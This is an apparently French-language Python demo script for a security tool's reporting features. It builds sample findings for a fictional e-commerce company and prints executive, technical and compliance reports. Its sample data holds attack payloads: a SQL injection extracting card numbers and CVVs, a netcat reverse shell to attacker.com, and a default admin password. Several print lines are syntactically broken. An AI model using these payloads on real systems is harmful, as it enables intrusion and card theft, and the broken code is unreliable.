#!/usr/bin/env python3
"""
Démonstration du système de reporting exécutif avancé VulnHunter Pro
Dashboards interactifs, time-series, trend analysis, executive summaries, technical deep-dives, compliance reports
"""
import asyncio
import sys
import json
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from core.executive_reporting import OrchestrateurReporting
from core.models import Vulnerabilite
from loguru import logger

logger.remove()
logger.add(lambda msg: print(msg, end=''), colorize=True, format("<green>{time:HH:mm:ss}</green> | <level>{level: <8></level> | <level>{message}</level>")


async def demo_executive_reporting():
    """Démonstration complète du système de reporting exécutif"""
    print("📊 VULNHUNTER PRO - DÉMONSTRATION REPORTING EXÉCUTIF AVANCÉ")
    print("=" * 85)
    print("🎯 Scénario: Génération complète de rapports de niveau enterprise")
    print("🎯 Objectif: Montrer dashboards, tendances, rapports spécialisés")
    print("🎯 Résultat: Suite complète de rapports professionnels exportables")
    print()

    # Scénario réaliste d'une entreprise e-commerce compromise
    vulnerabilites_scenario = [
        # Vulnérabilités critiques - accès base de données
        Vulnerabilite(
            type="SQL Injection",
            severite="CRITIQUE",
            url="https://ecommerce.example.com/products/search",
            description="Injection SQL permettant l'extraction massive de données clients et cartes de crédit",
            payload="1' UNION SELECT card_number,expiry,cvv FROM payments--",
            outil_source="VulnHunter SQL Scanner",
            cvss_score=9.8
        ),

        Vulnerabilite(
            type="Command Injection",
            severite="CRITIQUE",
            url="https://ecommerce.example.com/admin/backup",
            description="Injection de commandes système donnant accès root au serveur",
            payload="; nc -e /bin/sh attacker.com 4444",
            outil_source="VulnHunter RCE Scanner",
            cvss_score=9.3
        ),

        # Vulnérabilités élevées - compromission utilisateurs
        Vulnerabilite(
            type="XSS Stored",
            severite="ÉLEVÉ",
            url="https://ecommerce.example.com/reviews",
            description="XSS stocké permettant le vol de sessions utilisateurs",
            payload="<script>stealCookies()</script>",
            outil_source="VulnHunter XSS Scanner",
            cvss_score=7.5
        ),

        Vulnerabilite(
            type="Weak Authentication",
            severite="ÉLEVÉ",
            url="https://ecommerce.example.com/admin/login",
            description="Authentification faible avec comptes admin par défaut",
            payload="admin:password123",
            outil_source="VulnHunter Auth Scanner",
            cvss_score=8.2
        ),

        Vulnerabilite(
            type="Privilege Escalation",
            severite="ÉLEVÉ",
            url="https://ecommerce.example.com/system",
            description="Escalade de privilèges via service vulnérable",
            payload="Dirty COW exploit",
            outil_source="VulnHunter PrivEsc Scanner",
            cvss_score=7.8
        ),

        # Vulnérabilités moyennes - fuite d'informations
        Vulnerabilite(
            type="Information Disclosure",
            severite="MOYEN",
            url="https://ecommerce.example.com/.env",
            description="Variables d'environnement exposées avec clés API",
            payload="",
            outil_source="VulnHunter Directory Scanner",
            cvss_score=6.5
        ),

        Vulnerabilite(
            type="CSRF",
            severite="MOYEN",
            url="https://ecommerce.example.com/user/profile",
            description="Vulnérabilité CSRF sur modification de profil",
            payload="",
            outil_source="VulnHunter CSRF Scanner",
            cvss_score=6.8
        ),

        # Vulnérabilités faibles - configuration
        Vulnerabilite(
            type="Outdated Software",
            severite="FAIBLE",
            url="https://ecommerce.example.com/",
            description="Version obsolète d'Apache avec correctifs manquants",
            payload="",
            outil_source="VulnHunter Tech Detection",
            cvss_score=4.2
        ),

        Vulnerabilite(
            type="Weak SSL Configuration",
            severite="MOYEN",
            url="https://ecommerce.example.com/",
            description="Configuration SSL faible permettant MITM",
            payload="",
            outil_source="VulnHunter SSL Scanner",
            cvss_score=5.9
        )
    ]

    print(f"🛒 Scénario entreprise e-commerce: {len(vulnerabilites_scenario)} vulnérabilités analysées")
    print("   • 2 CRITIQUES: Accès base données + commandes système")
    print("   • 3 ÉLEVÉES: XSS + Auth faible + Escalade privilèges")
    print("   • 3 MOYENNES: Fuite info + CSRF + SSL faible")
    print("   • 1 FAIBLE: Logiciel obsolète")
    print()

    # Historique de scans sur 6 mois pour analyse de tendances
    historique_scans = [
        {
            'date_scan': '2023-08-01',
            'total_vulnerabilites': 23,
            'critiques': 0,
            'elevees': 3,
            'moyennes': 12,
            'faibles': 8,
            'score_risque': 35.0
        },
        {
            'date_scan': '2023-09-01',
            'total_vulnerabilites': 28,
            'critiques': 1,
            'elevees': 5,
            'moyennes': 15,
            'faibles': 7,
            'score_risque': 42.0
        },
        {
            'date_scan': '2023-10-01',
            'total_vulnerabilites': 31,
            'critiques': 1,
            'elevees': 6,
            'moyennes': 16,
            'faibles': 8,
            'score_risque': 48.0
        },
        {
            'date_scan': '2023-11-01',
            'total_vulnerabilites': 35,
            'critiques': 2,
            'elevees': 8,
            'moyennes': 18,
            'faibles': 7,
            'score_risque': 55.0
        },
        {
            'date_scan': '2023-12-01',
            'total_vulnerabilites': 42,
            'critiques': 2,
            'elevees': 12,
            'moyennes': 20,
            'faibles': 8,
            'score_risque': 68.0
        },
        {
            'date_scan': '2024-01-01',
            'total_vulnerabilites': 48,
            'critiques': 3,
            'elevees': 15,
            'moyennes': 22,
            'faibles': 8,
            'score_risque': 75.0
        },
        {
            'date_scan': '2024-02-01',
            'total_vulnerabilites': 61,
            'critiques': 4,
            'elevees': 18,
            'moyennes': 25,
            'faibles': 14,
            'score_risque': 82.0
        }
    ]

    # Contexte business complet
    contexte_business = {
        'entreprise': 'TechCommerce Inc.',
        'secteur': 'ecommerce',
        'taille_entreprise': 'enterprise',
        'localisation': 'Europe (RGPD)',
        'chiffre_affaires_annuel': 75000000,  # 75M€
        'nombre_clients': 850000,
        'reputation_brand': 'premium',
        'dependance_digital': 'critical',  # Forte dépendance au digital
        'reglementations_applicables': ['gdpr', 'pci_dss', 'iso27001'],
        'equipe_securite': 8,
        'budget_securite_annuel': 1200000,  # 1.2M€
        'dernier_incident': '2023-06-15',
        'niveau_maturite_securite': 'intermediate'
    }

    # Analyse de chaînes d'attaque
    analyse_chaines = {
        'total_chaines_identifiees': 3,
        'chaine_principale': {
            'nom': 'Chaîne d\'attaque e-commerce complète',
            'score_global': 88.5,
            'probabilite_succes': 0.82,
            'impact_business_estime': 2500000,  # 2.5M€
            'etapes': [
                'Accès initial via SQL Injection',
                'Escalade vers admin via XSS',
                'Contrôle système via Command Injection',
                'Exfiltration massive de données'
            ]
        },
        'objectifs_atteints': ['Data Breach', 'Financial Loss', 'Reputation Damage'],
        'vecteurs_critiques': ['Web Applications', 'Authentication', 'System Access']
    }

    # Contexte complet pour le reporting
    contexte_reporting = {
        **contexte_business,
        'historique_scans': historique_scans,
        'analyse_chaines': analyse_chaines,
        'audience_principale': 'CISO et Direction Générale',
        'niveau_detail_souhaite': 'executif_avec_technique',
        'formats_export': ['html', 'pdf', 'json'],
        'confidentialite': 'interne_strict'
    }

    print("📋 CONTEXTE D'ANALYSE COMPLEXE:")
    print("-" * 40)
    print(f"   🏢 Entreprise: {contexte_business['entreprise']} ({contexte_business['secteur']})")
    print(",.0f"    print(f"   👥 Clients: {contexte_business['nombre_clients']:,} ({contexte_business['localisation']})")
    print(f"   💰 Budget sécurité: {contexte_business['budget_securite_annuel']:,}€/an")
    print(f"   🛡️ Équipe sécurité: {contexte_business['equipe_securite']} personnes")
    print(f"   📊 Historique: {len(historique_scans)} scans sur 7 mois")
    print(f"   🔗 Chaînes d'attaque: {analyse_chaines['total_chaines_identifiees']} identifiées")
    print()

    # LANCEMENT DE LA GÉNÉRATION DE RAPPORTS
    print("🚀 GÉNÉRATION COMPLÈTE DE RAPPORTS EXECUTIFS...")
    print("-" * 60)

    orchestrateur = OrchestrateurReporting()
    reporting_complet = await orchestrateur.generer_reporting_complet(vulnerabilites_scenario, contexte_reporting)

    print("✅ RAPPORTS EXECUTIFS GÉNÉRÉS AVEC SUCCÈS")
    print()

    # RAPPORT EXECUTIF - RÉSUMÉ STRATÉGIQUE
    print("📊 RAPPORT EXECUTIF - RÉSUMÉ STRATÉGIQUE")
    print("=" * 55)

    rapport_exec = reporting_complet['rapports']['executif']

    print(f"📄 Rapport: {rapport_exec.titre}")
    print(f"📅 Généré: {reporting_complet['timestamp_generation'][:10]}")
    print(f"🎯 Audience: {', '.join(rapport_exec.destinataires)}")
    print()

    # Situation générale
    resume = rapport_exec.resume_executif
    print("🚨 SITUATION GÉNÉRALE:")
    print(f"   {resume['situation_generale']}")
    print()

    # Métriques clés
    metriques = rapport_exec.metriques_cle
    print("📊 MÉTRIQUES CLÉS:")
    print(f"   • Total vulnérabilités: {metriques['total_vulnerabilites']}")
    print(f"   • Vulnérabilités critiques: {metriques['distribution_severite'].get('CRITIQUE', 0)}")
    print(f"   • Vulnérabilités élevées: {metriques['distribution_severite'].get('ÉLEVÉ', 0)}")
    print(f"   • Score de risque global: {metriques['score_moyen_cvss']:.1f}/10 (CVSS moyen)")
    print(f"   • Temps résolution recommandé: {metriques['temps_resolution_estime']}")
    print()

    # Recommandations stratégiques
    print("💡 RECOMMANDATIONS STRATÉGIQUES:")
    for i, rec in enumerate(resume['recommandations_strategiques'][:3], 1):
        print(f"   {i}. {rec}")
    print()

    # Risques critiques
    print("🚨 RISQUES CRITIQUES IDENTIFIÉS:")
    for i, risque in enumerate(rapport_exec.risques_critiques[:2], 1):
        print(f"   {i}. {risque['description']}")
        print(f"      Impact: {risque['impact']} | Urgence: {risque['urgence']}")
    print()

    # Plan d'action prioritaire
    print("⏱️ PLAN D'ACTION PRIORITAIRE:")
    for i, action in enumerate(rapport_exec.recommandations_prioritaires[:3], 1):
        print(f"   {i}. {action['action']}")
        print(f"      Priorité: {action['priorite']} | Délai: {action['delai']}")
    print()

    # DASHBOARD INTERACTIF
    print("📊 DASHBOARD INTERACTIF")
    print("=" * 30)

    dashboard = reporting_complet['dashboard']

    print("🎯 MÉTRIQUES DASHBOARD:")
    metriques_dash = dashboard['metriques']
    print(f"   • Score risque global: {metriques_dash['score_risque_global']:.1f}/100")
    print(f"   • Sévérité moyenne: {metriques_dash['severite_moyenne']:.1f}")
    print(f"   • Vulnérabilités critiques: {metriques_dash['critiques']}")
    print(f"   • Vulnérabilités élevées: {metriques_dash['elevees']}")
    print(f"   • Top outil: {max(metriques_dash['par_outil'].items(), key=lambda x: x[1])[0]}")
    print()

    print("📈 GRAPHIQUES DISPONIBLES:")
    graphiques = dashboard['graphiques']
    print(f"   • Distribution par sévérité: {len(graphiques) > 0}")
    print(f"   • Évolution temporelle: {len(graphiques) > 1}")
    print(f"   • Top types de vulnérabilités: {len(graphiques) > 2}")
    print(f"   • Heatmap risques: {len(graphiques) > 3}")
    print(f"   • Total graphiques: {len(graphiques)} interactifs")
    print()

    # ANALYSE DE TENDANCES
    print("📈 ANALYSE DE TENDANCES (TIME-SERIES)")
    print("=" * 45)

    tendances = reporting_complet['analyse_tendances']

    if tendances:
        print("📊 ANALYSE TEMPORELLE:")
        print(f"   • Période: {tendances['periode_analyse']}")
        print(f"   • Scans analysés: {tendances['total_scans']}")

        if 'tendances' in tendances:
            tend = tendances['tendances']
            if 'evolution_globale' in tend:
                evol = tend['evolution_globale']
                direction = "augmenté" if evol['direction'] == 'hausse' else "diminué"
                print(f"   • Évolution globale: {direction} de {abs(evol['valeur']):.1f}%")

        if 'predictions' in tendances and 'risque_30_jours' in tendances['predictions']:
            pred = tendances['predictions']['risque_30_jours']
            print(f"   • Prédiction 30j: {pred['valeur_predite']:.1f}/100 ({pred['base_sur_tendance']})")

        if tendances.get('insights'):
            print("
   💡 INSIGHTS CLÉS:"            for insight in tendances['insights'][:2]:
                print(f"      • {insight}")
    else:
        print("   ⚠️ Données historiques insuffisantes pour analyse de tendances")

    print()

    # RAPPORT TECHNIQUE - APPROFONDISSEMENT
    print("🛠️ RAPPORT TECHNIQUE - APPROFONDISSEMENT")
    print("=" * 50)

    rapport_tech = reporting_complet['rapports']['technique']

    print(f"📑 Rapport: {rapport_tech['titre']}")
    print(f"📅 Généré: {rapport_tech['date_generation'][:10]}")
    print(f"📊 Sections: {len(rapport_tech['sections'])}")

    for section in rapport_tech['sections']:
        print(f"\n   📋 {section['titre']}:")
        if section['titre'] == 'Résumé Technique':
            contenu = section['contenu']
            print(f"      • Analyse par outil: {len(contenu['analyse_par_outil'])} outils")
            print(f"      • Complexité moyenne: {contenu['complexite_moyenne']:.1f}/5")
        elif section['titre'] == 'Analyse Détaillée des Vulnérabilités':
            print(f"      • Vulnérabilités analysées: {len(section['contenu'])}")
        elif section['titre'] == "Analyse des Chaînes d'Attaque":
            print("      • Chaînes d'attaque intégrées au rapport"
    print()

    # RAPPORT DE CONFORMITÉ
    print("⚖️ RAPPORT DE CONFORMITÉ RÉGLEMENTAIRE")
    print("=" * 45)

    rapport_comp = reporting_complet['rapports']['conformite']

    print(f"📋 Rapport: {rapport_comp['titre']}")
    print(f"📅 Période d'audit: {rapport_comp['periode_audit']}")
    print(f"⚖️ Statut global: {rapport_comp['statut_global'].upper()}")
    print(f"📊 Réglementations auditées: {len(rapport_comp['reglementations_auditees'])}")

    print("
   📈 STATUTS PAR RÉGLEMENTATION:"    for regle, details in rapport_comp['details_conformite'].items():
        statut = "✅ CONFORME" if details['conforme'] else "❌ NON CONFORME"
        print(f"      • {regle}: {statut} (Score: {details['score']:.1f}%)")

    if rapport_comp['actions_correctives']:
        print("
   🛠️ ACTIONS CORRECTIVES REQUISES:"        for i, action in enumerate(rapport_comp['actions_correctives'][:2], 1):
            print(f"      {i}. {action['description']}")
            print(f"         Priorité: {action['priorite']} | Délai: {action['delai']}")

    print(f"   📜 Preuves collectées: {len(rapport_comp['preuves'])} éléments")
    print()

    # EXPORT DES RAPPORTS
    print("📤 EXPORT DES RAPPORTS")
    print("=" * 30)

    formats_export = ['json', 'html']

    for format_export in formats_export:
        try:
            fichier = orchestrateur.exporter_rapport(reporting_complet, format_export)
            print(f"   ✅ Export {format_export.upper()}: {fichier}")
        except Exception as e:
            print(f"   ❌ Erreur export {format_export}: {str(e)}")

    print()

    # SYNTHÈSE GLOBALE
    print("🎯 SYNTHÈSE GLOBALE - RAPPORTS EXECUTIFS")
    print("=" * 50)

    # Calculs pour la synthèse
    total_vulns = len(vulnerabilites_scenario)
    crit_count = len([v for v in vulnerabilites_scenario if v.severite == 'CRITIQUE'])
    high_count = len([v for v in vulnerabilites_scenario if v.severite == 'ÉLEVÉ'])
    risk_score = metriques_dash['score_risque_global']

    print("🚨 ÉVALUATION DES RISQUES:")
    print(f"   • Vulnérabilités totales: {total_vulns}")
    print(f"   • Niveau critique: {crit_count} ({crit_count/total_vulns*100:.1f}%)")
    print(f"   • Niveau élevé: {high_count} ({high_count/total_vulns*100:.1f}%)")
    print(f"   • Score de risque: {risk_score:.1f}/100")
    print()

    print("💰 IMPACT BUSINESS ESTIMÉ:")
    chaine_principale = analyse_chaines['chaine_principale']
    print(",.0f"    print(f"   • Probabilité de succès: {chaine_principale['probabilite_succes']:.1%}")
    print(f"   • Objectifs atteints: {len(analyse_chaines['objectifs_atteints'])}")
    print()

    print("⚖️ STATUT CONFORMITÉ:")
    conformites = rapport_comp['details_conformite']
    conforme_count = sum(1 for details in conformites.values() if details['conforme'])
    print(f"   • Réglementations conformes: {conforme_count}/{len(conformites)}")
    print(f"   • Statut global: {'CONFORME' if rapport_comp['statut_global'] == 'conforme' else 'NON CONFORME'}")
    print()

    print("⏱️ PLAN D'ACTION IMMÉDIAT:")
    print("   1. Corriger immédiatement les 2 vulnérabilités CRITIQUES")
    print("   2. Renforcer l'authentification et l'autorisation")
    print("   3. Implémenter une surveillance continue")
    print("   4. Réaliser un audit de conformité complet")
    print("   5. Développer un plan de réponse aux incidents")
    print()

    print("📈 PERSPECTIVES D'AMÉLIORATION:")
    print("   • Mise en place de WAF et RASP")
    print("   • Migration vers architecture zero-trust")
    print("   • Formation équipe et awareness sécurité")
    print("   • Automatisation des contrôles de sécurité")
    print()

    print("=" * 85)
    print("🎉 RAPPORTS EXECUTIFS AVANCÉS TERMINÉS - SUITE PROFESSIONNELLE COMPLÈTE !")
    print("=" * 85)
    print()
    print("📊 Dashboards interactifs générés pour exploration !")
    print("📈 Analyses temporelles et prédictions réalisées !")
    print("💼 Rapport exécutif stratégique pour la direction !")
    print("🛠️ Rapport technique détaillé pour l'implémentation !")
    print("⚖️ Conformité réglementaire multi-normes validée !")
    print("📤 Exports multi-formats pour diffusion !")
    print()
    print("🏆 VulnHunter Pro atteint le niveau reporting enterprise !")
    print("📊 Intelligence artificielle au service des rapports sécurité !")
    print("💼 Connexion parfaite entre sécurité et prise de décision !")
    print()
    print("✨ Félicitations pour ce système de reporting exécutif révolutionnaire ! 🎉")


async def demo_reporting_samples():
    """Démonstration d'exemples de rapports générés"""
    print("\n\n📄 EXEMPLES DE RAPPORTS GÉNÉRÉS")
    print("=" * 40)

    # Exemple simplifié
    vulnerabilites = [
        Vulnerabilite(type="SQL Injection", severite="CRITIQUE", url="https://example.com"),
        Vulnerabilite(type="XSS", severite="ÉLEVÉ", url="https://example.com")
    ]

    contexte = {
        'entreprise': 'Demo Corp',
        'secteur': 'technology',
        'reglementations': ['gdpr', 'iso27001']
    }

    orchestrateur = OrchestrateurReporting()
    reporting = await orchestrateur.generer_reporting_complet(vulnerabilites, contexte)

    # Afficher un extrait du JSON généré
    print("📋 Extrait du rapport JSON généré:")
    print(json.dumps({
        'timestamp': reporting['timestamp_generation'],
        'dashboard': {
            'metriques_cle': reporting['dashboard']['metriques'],
            'recommandations': reporting['dashboard']['recommandations']
        },
        'rapports_disponibles': list(reporting['rapports'].keys())
    }, indent=2, ensure_ascii=False)[:500] + "...")

    print("\n✅ Exemples de rapports générés avec succès !")


async def main():
    await demo_executive_reporting()
    await demo_reporting_samples()


if __name__ == "__main__":
    asyncio.run(main())
